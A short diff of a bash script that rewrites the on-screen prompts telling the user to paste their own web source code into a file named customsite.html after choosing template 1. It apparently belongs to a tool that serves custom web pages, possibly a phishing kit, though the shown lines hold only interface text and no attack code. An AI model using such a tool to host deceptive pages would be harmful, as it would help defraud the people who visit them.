@@ -157,8 +157,8 @@ default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-printf "\e[1;31m #Attention# \e[0m\n"
-printf "\e[1;35m press enter And paste your web source code \e[0m\n"
+read -p $'\n\e[1;41m    ################Attention#################  \e[0m 
+\e[2;33m   Press Enter And Take down completely then you will see the text  <!--- Paste your source code here-->. Paste your source code below the text.  \e[0m ' 
 
 nano customsite.html
 read -p $'\n\e[3;2m[\e[0m\e[3;2m+\e[0m\e[3;2m] Press enter to continue the process
